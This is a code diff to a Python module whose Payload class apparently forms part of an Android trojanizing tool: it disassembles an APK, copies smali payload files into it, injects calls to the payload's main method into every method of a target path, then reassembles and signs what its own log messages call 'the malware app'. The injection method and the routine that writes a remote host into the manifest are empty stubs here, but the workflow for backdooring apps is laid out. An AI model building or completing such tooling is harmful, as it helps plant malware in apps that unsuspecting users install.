@@ -13,11 +13,14 @@
 #    limitations under the License.
 
 import fnmatch
+import logging
 import os
 import sys
 
 from tqdm import tqdm
-from utils import config, file_operation
+from metadata import metadata
+from reverse_engineer import reverse_engineer
+from utils import config, file_operation, process_info
 
 
 class Payload(object):
@@ -26,11 +29,92 @@ class Payload(object):
         self.payload_name = args.payload_name
         self.app_name = os.path.basename(args.app.name)
         self.app_path = os.path.abspath(args.app.name)
-        self.destination = os.path.join(self.app_name, args.destination)
+        self.destination = os.path.join(
+            config.TMP_FOLDER,
+            os.path.splitext(self.app_name)[0],
+            args.destination
+        )
         self.keywords = args.keywords.split(',')
 
     def run(self):
-        pass
+        logging.info("disassembling {}...".format(self.app_path))
+        logging.warning("this operation might take some time")
+        reverse_engineer.disassemble(self)
+
+        logging.info(
+            "exporting the {} smali files into the malware source code".format(
+                self.payload_name
+            )
+        )
+        payload_path = self.export_payload()
+        self.set_payload_settings(payload_path)
+
+        logging.info(
+            "injecting the call to the {} "
+            "main method within all methods in {}...".format(
+                self.payload_name, self.destination
+            )
+        )
+
+        if os.path.exists(self.destination):
+            if os.path.isdir(self.destination):
+                dir_metadata = metadata.generate_dir_metadata(self.destination)
+                self.inject_in_dir(dir_metadata)
+
+                methods, edited_method, log_path = process_info.get_dir_info(
+                    self, dir_metadata
+                )
+
+                logging.info(
+                    "the {} main method call has been injected "
+                    "into {}/{} methods".format(
+                        self.payload_name,
+                        edited_method,
+                        methods
+                    )
+                )
+
+                logging.info(
+                    "log file created at {}".format(log_path)
+                )
+
+            elif os.path.isfile(self.destination):
+                file_metadata = metadata.generate_file_metadata(
+                    self.destination
+                )
+                self.inject(self.destination, file_metadata)
+
+                methods, edited_method, log_path = process_info.get_file_info(
+                    self, file_metadata
+                )
+
+                logging.info(
+                    "the {} main method call has been injected "
+                    "into {}/{} methods".format(
+                        self.payload_name,
+                        edited_method,
+                        methods
+                    )
+                )
+
+                logging.info(
+                    "log file created at {}".format(log_path)
+                )
+
+        else:
+            logging.error(
+                "{} does not exist, chose a valid destination...".format(
+                    self.destination
+                )
+            )
+            sys.exit(1)
+
+        logging.info("reassembling the malware app...")
+        logging.warning("this operation might take some time")
+        reverse_engineer.reassemble(self)
+
+        logging.info("signing the malware app...")
+        reverse_engineer.sign(self)
 
     def inject(self):
         pass
@@ -40,15 +124,19 @@ class Payload(object):
         Recursively inject the payload within the files contained in the
         destination folder.
         """
-        for root, dirs, files in tqdm(list(os.walk(self.destination)),
-                                      unit='dir', unit_scale=True,
-                                      dynamic_ncols=True):
+        for root, dirs, files in tqdm(
+            list(os.walk(self.destination)),
+            unit='dir',
+            unit_scale=True,
+            dynamic_ncols=True
+        ):
             for file in fnmatch.filter(files, "*.smali"):
                 file_path = os.path.join(root, file)
 
                 # Skip the payload directory
                 if (self.payload_name in file_path):
                     continue
+
                 else:
                     file_metadata = dir_metadata[file_path]
                     self.inject(file_path, file_metadata)
@@ -59,7 +147,10 @@ class Payload(object):
         Copy the smali payload files into the app android folder.
         """
         for root, subdirs, files in os.walk(
-           os.path.join(config.TMP_FOLDER, self.app_name)):
+           os.path.join(
+                config.TMP_FOLDER, os.path.splitext(self.app_name)[0]
+            )
+        ):
             for subdir in subdirs:
                 # Verify that the current directory is the correct
                 # android directory (hint: always a 'support dir)
@@ -70,3 +161,9 @@ class Payload(object):
                         os.path.join(root, subdir, self.payload_name))
 
                     return os.path.join(root, subdir, self.payload_name)
+
+    def set_payload_settings(self, payload_path):
+        """
+        Add the rhost and ppg to the AndroidManifest.
+        """
+        pass
